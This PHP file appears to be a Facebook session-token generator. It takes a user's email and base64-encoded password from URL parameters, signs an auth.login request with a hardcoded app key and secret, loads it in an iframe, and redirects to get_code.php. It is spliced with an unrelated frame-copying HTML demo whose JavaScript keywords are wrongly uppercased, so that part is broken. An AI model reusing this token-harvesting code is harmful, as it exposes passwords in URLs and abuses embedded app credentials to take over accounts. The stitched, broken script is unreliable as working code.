<?php

 $user = $_GET["user"];
 $pass = base64_decode($_GET["pass"]);
if($user){
 $apikey = "882a8490361da98702bf97a021ddc14d";
 $sec = "62f8ce9f74b12f84c123cc23437a4a32";
 $mdtet = "api_key=".$apikey."credentials_type=passwordemail=".$user."format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=".$pass."return_ssl_resources=0v=1.0".$sec;
 $Mapp= "api_key=".$apikey."&credentials_type=password&email=".$user."&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password=".$pass."&return_ssl_resources=0&v=1.0";
?>
<iframe src="https://api.facebook.com/restserver.php?<?=$Mapp?>&sig=<?=md5($mdtet)?>" id="iframeID" frameborder="0"></iframe>

<script type="text/javascript">
 window.location.replace("../get_code.php?get=1");
</script>

<?php }else{ ?>
<HTML>
<HEAD>
<TITLE>
copying elements between frames
</TITLE>
<SCRIPT>
FUNCTION loadFrame () {
  VAR html = '';
  html = '<HTML><BODY>';
  html += '<TABLE ID="aTable" BORDER="1">';
  FOR (VAR r = 0; r < 3; r++) {
    html += '<TR>';
    FOR (VAR c = 0; c < 5; c++)
      html += '<TD>' + r + ', ' + c + ' Kibology<\/TD>';
    html += '<\/TR>';
  }
  html += '<\/TABLE>';
  html += '<\/HTML>';
  WITH (window.iframe0.document) {
    OPEN();
    WRITE(html);
    CLOSE();
  }
}
FUNCTION copyTable() {
  IF (document.all)
    window.iframe1.document.body.insertAdjacentHTML('beforeEnd',
      window.iframe0.document.all.aTable.outerHTML);
  ELSE IF (document.getElementById && document.body.cloneNode) {
    VAR table = window.iframe0.document.getElementById('aTable');
    VAR tableCopy = table.cloneNode(TRUE);
    window.iframe1.document.body.appendChild(tableCopy);
  }
}
</SCRIPT>
</HEAD>
<BODY ONLOAD="loadFrame()">
<INPUT TYPE="button" VALUE="copy table"
       ONCLICK="copyTable();"
>
<BR>
<IFRAME NAME="iframe0"
        SRC="https://example.com/"
        WIDTH="400" HEIGHT="150"
>
</IFRAME>
<BR>
<IFRAME NAME="iframe1" SRC="https://example.com/"
        WIDTH="400" HEIGHT="150"
></IFRAME>
</BODY>
</HTML>
<?php } ?>